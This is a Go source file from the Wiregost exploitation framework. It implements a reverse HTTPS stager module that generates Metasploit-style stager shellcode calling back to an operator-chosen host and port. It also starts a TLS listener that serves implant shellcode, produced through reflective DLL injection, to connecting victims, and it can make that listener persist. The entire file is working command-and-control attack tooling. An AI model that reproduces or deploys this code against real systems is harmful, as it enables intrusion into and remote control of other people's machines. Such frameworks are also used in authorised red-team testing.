// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package reverse_https

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/tui"

	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseHttpsStager - A single stage MTLS implant
type ReverseHttpsStager struct {
	*module.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseHttpsStager {
	mod := &ReverseHttpsStager{&module.Module{}}
	mod.Path = []string{"payload/multi/stager/reverse_https"}
	return mod
}

var modLog = log.ServerLogger("payload/multi/stager/reverse_https", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseHttpsStager) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case consts.ModuleRun:
		return s.CompileStager()
	case consts.ModuleToListener:
		return s.toListener()
	}

	return "", nil
}

func (s *ReverseHttpsStager) toListener() (result string, err error) {
	host := s.Options["LHostListener"].Value
	if host == "" {
		return "", errors.New("You must specify a listener LHost")
	}
	portUint, err := strconv.Atoi(s.Options["LPortListener"].Value)
	if err != nil {
		return "", errors.New("Error parsing listener LPort")
	}
	port := uint16(portUint)
	if port == 0 {
		return "", errors.New("Invalid listener LPort")
	}

	// Persistence
	persist := ""
	if s.Options["Persist"].Value == "true" {
		persist = fmt.Sprintf("%s[P]%s ", tui.GREEN, tui.RESET)
	}

	// Check StageImplant exists, and is the appropriate format
	implant := s.Options["StageImplant"].Value
	config := &generate.GhostConfig{}
	ghostBytes := []byte{}
	if implant == "" {
		return "", errors.New("You must specify a Ghost implant build (shellcode/shared_lib) name")
	} else {
		// Find all ghost names
		ghosts, _ := generate.GhostFiles()
		for _, g := range ghosts {
			ghost := strings.TrimPrefix(g, ".")
			// If ghost is found in names...
			if ghost == implant {
				// Fetch config for checking format
				config, err = generate.GhostConfigByName(ghost)
				if err != nil {
					return "", errors.New("Cannot find Implant config: Impossible to check its format")
				} else {
					// If format is good, keep the bytes
					if (config.Format == pb.GhostConfig_SHARED_LIB) || (config.Format == pb.GhostConfig_SHELLCODE) {
						ghostBytes, err = generate.GhostFileByName(ghost)
						break
					} else {
						return "", errors.New("Wrong format: The provided Ghost Implant Stage is of format EXECUTABLE")
					}
				}
			}
		}
		if len(ghostBytes) == 0 {
			return "", errors.New("The provided Implant Stage does not exist in DB")
		}
	}

	// Generate the Shellcode to attach to stager listener
	ghostShellcode, err := generate.ShellcodeRDIFromBytes(ghostBytes, "RunGhost", "")
	if err != nil {
		shellcodeError := fmt.Sprintf("Error generating listener stage: %s", err.Error())
		return "", errors.New(shellcodeError)
	}

	// Start HTTP listener
	conf := &c2.HTTPServerConfig{
		Addr:   fmt.Sprintf("%s:%d", host, port),
		LPort:  port,
		Domain: host,
		Secure: true,
		ACME:   true,
	}
	server := c2.StartHTTPSListener(conf)
	name := "https"
	server.GhostShellcode = ghostShellcode

	job := &core.Job{
		ID:   core.GetJobID(),
		Name: "HTTPS stager",
		Description: fmt.Sprintf("%sReverse HTTPS stager listener (domain: %s%s%s), serving %s%s%s (%s/%s) as shellcode",
			persist, tui.BLUE, conf.Domain, tui.RESET, tui.YELLOW, implant, tui.RESET, config.GOOS, config.GOARCH),
		Protocol: "tcp",
		Port:     port,
		JobCtrl:  make(chan bool),
	}

	// Save persist
	if s.Options["Persist"].Value == "true" {
		err := c2.PersistHTTPSStager(job, host, implant)
		if err != nil {
			s.Event("Error saving persistence: " + err.Error())
		}
	}

	core.Jobs.AddJob(job)

	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		err := server.HTTPServer.ListenAndServeTLS("", "")
		if err != nil {
			modLog.Errorf("%s listener error %v", name, err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}
	}()

	go func() {
		<-job.JobCtrl
		modLog.Infof("Stopping HTTPS Stager listener (%d) ...", job.ID)
		once.Do(func() { cleanup(nil) })
	}()

	return fmt.Sprintf("Reverse HTTPS Stager listener started at %s:%d (domain: %s), serving %s as shellcode", host, port, conf.Domain, implant), nil
}

func (s *ReverseHttpsStager) CompileStager() (result string, err error) {

	// Check options
	host := s.Options["LHostStager"].Value
	if host == "" {
		return "", errors.New("You must specify a stager LHost")
	}
	portUint, err := strconv.Atoi(s.Options["LPortStager"].Value)
	if err != nil {
		return "", errors.New("Error parsing stager LPort")
	}
	port := uint16(portUint)
	if port == 0 {
		return "", errors.New("Invalid stager LPort")
	}
	format := s.Options["OutputFormat"].Value
	if format == "" {
		return "", errors.New("You must specify a MSF Venom output format")
	}
	arch := s.Options["Arch"].Value
	if arch == "" {
		return "", errors.New("You must specify a CPU architecture for the Stager")
	}

	// Create stager shellcode
	s.Event("Generating HTTPS MSF Stager, this should take a few seconds...")
	stage, err := generate.MsfStage(host, port, arch, format, "https")
	if err != nil {
		errStage := fmt.Sprintf("Failed to generate MSF stager: %s", err.Error())
		return "", errors.New(errStage)
	}

	// If needed, save the payload
	save := s.Options["FileName"].Value
	if save != "" || format == "raw" {
		filename := ""
		if save == "" {
			// We need a default name, so this code is needed
			implant := s.Options["StageImplant"].Value
			configName := s.Options["StageConfig"].Value
			config := &generate.GhostConfig{}
			if configName == "" {
				if implant == "" {
					return "", errors.New("You must specify a Ghost implant name, either for StageConfig or StageImplant")
				} else {
					config, err = generate.GhostConfigByName(implant)
					if err != nil {
						return "", errors.New("Defaulted to StageImplant for Stager config, but config does not exist")
					}
				}
			} else {
				config, err = generate.GhostConfigByName(implant)
				if err != nil {
					return "", errors.New("Invalid Ghost implant name for Stager config")
				}
			}

			filename = fmt.Sprintf("%s_stager.%s", config.Name, format)
		} else {
			filename = fmt.Sprintf("%s_stager.%s", save, format)
		}

		if !strings.HasSuffix(filename, fmt.Sprintf("_stager.%s", format)) {
			filename = filename + fmt.Sprintf("_stager.%s", format)
		}
		saveTo := fmt.Sprintf(filepath.Join(assets.GetStagersDir(), filename))
		err = ioutil.WriteFile(saveTo, stage, os.ModePerm)
		if err != nil {
			result = fmt.Sprintf("Failed to write stager as %s", saveTo)
			return "", errors.New(result)
		}
		result = fmt.Sprintf("Reverse TCP stager saved as %s", saveTo)
		return result, nil
	}

	// Else, return the raw shellcode
	return string(stage), nil
}
